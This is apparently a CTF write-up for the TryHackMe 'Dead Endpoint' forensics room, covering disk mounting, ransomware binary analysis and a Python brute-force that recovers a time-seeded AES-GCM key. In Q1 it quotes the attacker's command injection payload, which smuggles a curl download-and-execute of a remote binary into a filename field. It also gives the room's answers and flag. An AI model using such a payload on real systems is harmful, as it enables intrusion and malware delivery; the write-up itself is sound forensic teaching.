# THM Dead Endpoint — Forensics Writeup

**Date:** 2026-10-24  

---

## Room Overview

**Dead Endpoint** is a HARD-rated Linux forensics room on TryHackMe. It presents a GPT-partitioned disk image of a Linux gallery server compromised through a command injection vulnerability. The attacker downloaded and executed custom ransomware that encrypted JPEG files using AES-256-GCM with a time-seeded splitmix64 PRNG.

**Category:** Forensics / Malware Analysis  
**Tools:** loop mount, SQLite3, objdump/Ghidra, Python 3 (`cryptography` library)

---

## Environment Setup

Mount the GPT disk image to inspect the filesystem:

```bash
sudo losetup -P /dev/loop0 disk.img
sudo fdisk -l /dev/loop0          # identify partition start sector
sudo mount -o ro,offset=$((START * 512)) /dev/loop0 /mnt/disk
```

Key paths:

| Path | Contents |
| --- | --- |
| `/mnt/disk/srv/gallery/media/originals/` | Gallery JPEGs (some `.locked`) |
| `/mnt/disk/srv/gallery/data/gallery.sqlite3` | Activity logs, export records |
| `/mnt/disk/srv/gallery/.cache/.indexd` | Ransomware binary |

---

## Q1–Q4: Initial Enumeration

**Q1 — Vulnerable endpoint / attack vector**

The SQLite `exports` table contained a command injection payload in the filename field:

```
yard_0147.jpg; curl -fsS http://10.0.2.2:18081/assets/media-worker \
  -o /srv/gallery/.cache/.indexd && chmod 700 /srv/gallery/.cache/.indexd \
  && /srv/gallery/.cache/.indexd
```

**Q2 — Malware path:** `/srv/gallery/.cache/.indexd`

**Q3 — SHA-256:** `sha256sum /mnt/disk/srv/gallery/.cache/.indexd`

**Q4 — Encryption algorithm:** AES-256-GCM (confirmed via OpenSSL EVP API calls in disassembly)

---

## Q5: PRNG Seed — Binary Analysis and Brute-Force

**Answer: `1792474614662`**

### Key generation (from disassembly)

1. `clock_gettime(CLOCK_REALTIME, &ts)` at address `0x1b35`
2. `seed = ts.tv_sec * 1000 + ts.tv_nsec / 1000000` — millisecond Unix timestamp
3. Four splitmix64 iterations → four `uint64_t` values packed LE → 32-byte AES key

**splitmix64 constants:** `0x9e3779b97f4a7c15`, `0xbf58476d1ce4e5b9`, `0x94d049bb133111eb`

### Encrypted file header layout

| Offset | Size | Contents |
| --- | --- | --- |
| `0x00` | 4 B | Magic: `GPH1` |
| `0x04` | 4 B | Version `0x01` + padding |
| `0x08` | 8 B | Original file size (LE64) |
| `0x10` | 12 B | IV (`RAND_bytes`) |
| `0x1C` | 16 B | GCM authentication tag |
| `0x2C` | 4 B | Padding |
| `0x30+` | — | Ciphertext |

### Critical AAD discovery

Disassembly at `0x1776`:

```c
EVP_EncryptUpdate(ctx, NULL, &len, header, 0x1c)
```

**NULL output pointer** = OpenSSL GCM AAD mode. The first 28 bytes of the header (`header[0x00:0x1C]`) are used as AAD. Without this, every brute-force attempt fails authentication even with the correct key.

### Pinpointing the timestamp

- SQLite `exports` record timestamp: `2026-10-20 05:36:54.554 UTC`
- `ctime` of `yard_0147.jpg.locked` on disk image: `05:36:54.696`
- Search window: seed_ms `1792474614000`–`1792474614999` (1000 candidates)

**Note:** `mtime` was spoofed by `utimes()` to preserve the original JPEG timestamp. Only `ctime` reflects when the malware wrote the file. Using `cp` to extract files loses both; always `stat` files on the mounted image directly.

### Cracking script

```python
import struct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def splitmix64(state):
    state = (state + 0x9e3779b97f4a7c15) & 0xFFFFFFFFFFFFFFFF
    x = state
    x = ((x ^ (x >> 30)) * 0xbf58476d1ce4e5b9) & 0xFFFFFFFFFFFFFFFF
    x = ((x ^ (x >> 27)) * 0x94d049bb133111eb) & 0xFFFFFFFFFFFFFFFF
    return state, x ^ (x >> 31)

def derive_key(seed_ms):
    seed = seed_ms & 0xFFFFFFFFFFFFFFFF
    key = b''
    for _ in range(4):
        seed, val = splitmix64(seed)
        key += struct.pack('<Q', val)
    return key

with open('yard_0147.jpg.locked', 'rb') as f:
    header = f.read(0x30)
    ciphertext = f.read()

iv  = header[0x10:0x1c]   # 12 bytes
tag = header[0x1c:0x2c]   # 16 bytes
aad = header[0x00:0x1c]   # 28 bytes — AAD (EVP_EncryptUpdate with NULL out)
ct_with_tag = ciphertext + tag

for seed_ms in range(1792474614000, 1792474615000):
    key = derive_key(seed_ms)
    aesgcm = AESGCM(key)
    try:
        pt = aesgcm.decrypt(iv, ct_with_tag, aad)
        if pt[:3] == b'\xff\xd8\xff':
            print(f'FOUND: seed_ms = {seed_ms}')
            break
    except Exception:
        pass
```

Result: **`seed_ms = 1792474614662`**

---

## Q6: Decrypting yard_0152.jpg

**Flag: `THM{R4ns0mw4r3_K3ys_Ar3_A_M4tt3r_0f_T1m3}`**

All files in a single malware run share the same AES key (generated once at startup). Each file has its own IV in its header. Decrypt `yard_0152.jpg.locked` using the key from seed `1792474614662` and the IV/tag/AAD from its own header:

```python
with open('yard_0152.jpg.locked', 'rb') as f:
    hdr2 = f.read(0x30)
    ct2  = f.read()

iv2  = hdr2[0x10:0x1c]
tag2 = hdr2[0x1c:0x2c]
aad2 = hdr2[0x00:0x1c]

key = derive_key(1792474614662)
aesgcm = AESGCM(key)
pt2 = aesgcm.decrypt(iv2, ct2 + tag2, aad2)

with open('yard_0152.jpg', 'wb') as f:
    f.write(pt2)
```

The decrypted image is an inspection checklist photograph containing the flag.

---

## Key Lessons

1. **AAD in AES-GCM** — `EVP_EncryptUpdate(ctx, NULL, ...)` signals AAD, not ciphertext. A single missed NULL in the disassembly makes every brute-force attempt fail silently.

2. **`ctime` vs `mtime`** — Ransomware restores the original `mtime` via `utimes()`. Always use `ctime` for timing when the malware actually wrote the file.

3. **`cp` destroys timestamps** — Extract files with `dd` or `stat` them in-place; never rely on timestamps of copied files.

4. **SQLite logs** — The `exports` table recorded the injection payload and sub-second timestamp, cross-validating `ctime` and enabling a 1000-candidate brute-force.

5. **Millisecond seeds** — 1-second window = 1000 ms seeds. Pure Python decrypts all of them in under a second.
